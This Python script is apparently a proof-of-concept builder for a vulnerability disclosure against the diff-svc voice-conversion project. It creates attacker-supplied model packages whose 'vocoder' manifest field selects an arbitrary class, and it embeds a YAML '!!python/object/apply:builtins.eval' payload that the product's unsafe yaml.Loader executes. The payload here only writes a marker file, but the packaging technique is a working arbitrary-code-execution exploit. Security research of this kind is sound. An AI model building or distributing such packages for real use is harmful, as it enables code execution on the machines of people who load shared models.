#!/usr/bin/env python3
"""Build the attacker-supplied diff-svc model packages used by this PoC.

The documented way to consume a diff-svc model package is::

    python run.py --config checkpoints/<project>/config.yaml

``checkpoints/<project>/config.yaml`` is the package's manifest.  It is parsed
with ``yaml.safe_load`` (utils/hparams.py), so the manifest itself is inert --
but the plain top-level string field ``vocoder`` is later handed to
``network/vocoders/base_vocoder.py:get_vocoder_cls()``, which resolves it with
``importlib.import_module`` + ``getattr`` and no allowlist.

This script writes four packages under ``<repo>/checkpoints/`` that are
byte-identical except for that single ``vocoder`` line:

  evil_pwg           network.vocoders.pwg.PWG            positive sample
  evil_hifigan       network.vocoders.hifigan.HifiGAN    negative control
  evil_arbitrary     json.decoder.JSONDecodeError        arbitrary-class control
  evil_missing_attr  network.vocoders.pwg.NoSuchVocoderClass
                     resolution-site anchor: the missing attribute makes the
                     interpreter raise *at base_vocoder.py:18*, so the traceback
                     names the exact line that resolves the manifest string

Each package also carries ``vocoder_dir/`` with the two files the product's own
vocoder construction chain looks for (``config.yaml`` and
``model_ckpt_steps_<n>.ckpt``).  No ``.py`` file, native library or plugin is
placed anywhere inside a package: every class named above already exists in the
victim's installed product environment, and the class that is actually called is
selected purely by the manifest string.

The script additionally materialises the victim-side prerequisite
``checkpoints/hubert/hubert_soft.pt``.  The upstream checkpoint is a ~360 MB
binary that is not redistributable here; the stand-in is built from the
repository's *own* ``HubertSoft()`` architecture with a fixed seed and stored in
float16 (180 MB).  ``hubert_soft()`` casts it back to float32, so the code path
that runs is identical -- only the weight values are random.  It is required
before ``get_vocoder_cls()`` is reached, because ``TtsTask.__init__`` builds a
``Hubertencoder`` first.
"""

import argparse
import hashlib
import sys
from pathlib import Path

# (package name, value written to the documented top-level `vocoder` field)
VARIANTS = [
    ("evil_pwg", "network.vocoders.pwg.PWG"),
    ("evil_hifigan", "network.vocoders.hifigan.HifiGAN"),
    ("evil_arbitrary", "json.decoder.JSONDecodeError"),
    ("evil_missing_attr", "network.vocoders.pwg.NoSuchVocoderClass"),
]

HUBERT_SEED = 1234

# The vocoder directory config of every package.  `generator_params` is a valid
# ParallelWaveGAN generator configuration, so network/vocoders/pwg.py:16-50
# builds the model, loads the checkpoint and returns -- i.e. the product's own
# construction chain really runs.  The tagged node is the payload: pwg.py:19
# parses this very file with yaml.load(f, Loader=yaml.Loader), which constructs
# arbitrary Python objects.  The identical file read through
# utils/hparams.py (yaml.safe_load) by the HifiGAN control is rejected instead.
PAYLOAD_TEMPLATE = """\
# vocoder_dir/config.yaml -- vocoder files of the delivered model package.
generator_params:
  aux_channels: 80
  aux_context_window: 2
  gate_channels: 32
  layers: 6
  residual_channels: 16
  skip_channels: 16
  stacks: 3
  upsample_params:
    upsample_scales: [4, 4, 4, 4]
marker: !!python/object/apply:builtins.eval
  - "__import__('pathlib').Path('checkpoints/{name}/vocoder_dir/DISPATCH_EFFECT.txt').write_text('class actually called: {value}')"
"""


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def build_hubert(repo):
    """Materialise the victim-side checkpoints/hubert/hubert_soft.pt stand-in."""
    import torch

    out = repo / "checkpoints" / "hubert" / "hubert_soft.pt"
    if out.exists():
        print(f"| hubert stand-in already present: {out} ({out.stat().st_size >> 20} MiB)")
        return out

    sys.path.insert(0, str(repo))
    from network.hubert.hubert_model import HubertSoft

    out.parent.mkdir(parents=True, exist_ok=True)
    torch.manual_seed(HUBERT_SEED)
    model = HubertSoft()
    # float16 halves the file; hubert_soft()'s load_state_dict() casts back up.
    torch.save({k: v.half() for k, v in model.state_dict().items()}, out)
    print(f"| wrote hubert stand-in: {out} ({out.stat().st_size >> 20} MiB, seed={HUBERT_SEED})")
    return out


def build_package(repo, name, value):
    import torch
    import yaml

    base = yaml.safe_load((repo / "training" / "config.yaml").read_text(encoding="utf-8"))

    pkg = repo / "checkpoints" / name
    vdir = pkg / "vocoder_dir"
    vdir.mkdir(parents=True, exist_ok=True)

    cfg = dict(base)
    cfg["vocoder"] = value
    cfg["vocoder_ckpt"] = f"checkpoints/{name}/vocoder_dir"
    cfg["work_dir"] = f"checkpoints/{name}"
    (pkg / "config.yaml").write_text(yaml.safe_dump(cfg), encoding="utf-8")

    (vdir / "config.yaml").write_text(
        PAYLOAD_TEMPLATE.format(name=name, value=value), encoding="utf-8"
    )
    torch.save({"state_dict": {}}, vdir / "model_ckpt_steps_1000.ckpt")

    print(f"\n| package checkpoints/{name}/   vocoder: {value}")
    for f in sorted(pkg.rglob("*")):
        if f.is_file():
            rel = f.relative_to(repo).as_posix()
            print(f"    {f.stat().st_size:>9}  {rel}")
    return pkg


def write_sha256sums(repo, path):
    """Write the sample manifest with paths relative to checkpoints/ so that the
    lines stay readable in a normal terminal width."""
    files = sorted(repo.glob("checkpoints/evil_*/**/*")) + sorted(repo.glob("checkpoints/evil_*/*"))
    base = repo / "checkpoints"
    lines = ["# sha256 (paths are relative to checkpoints/)"]
    for f in dict.fromkeys(files):
        if f.is_file():
            lines.append(f"{sha256(f)}  {f.relative_to(base).as_posix()}")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"\n| wrote {path} ({len(lines) - 1} files)")
    return lines


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--repo", default=str(Path(__file__).resolve().parent / "repo"),
                    help="path of the pinned diff-svc checkout (default: ./repo)")
    args = ap.parse_args()

    repo = Path(args.repo).resolve()
    if not (repo / "run.py").is_file():
        sys.exit(f"not a diff-svc checkout: {repo}")

    print(f"| repo: {repo}")
    build_hubert(repo)
    for name, value in VARIANTS:
        build_package(repo, name, value)

    write_sha256sums(repo, Path(__file__).resolve().parent / "SHA256SUMS.txt")

    print("\n| built %d model packages; they differ only in the `vocoder` line of"
          " checkpoints/<pkg>/config.yaml" % len(VARIANTS))
    print("| run them with:  python run.py --config checkpoints/<pkg>/config.yaml")


if __name__ == "__main__":
    main()
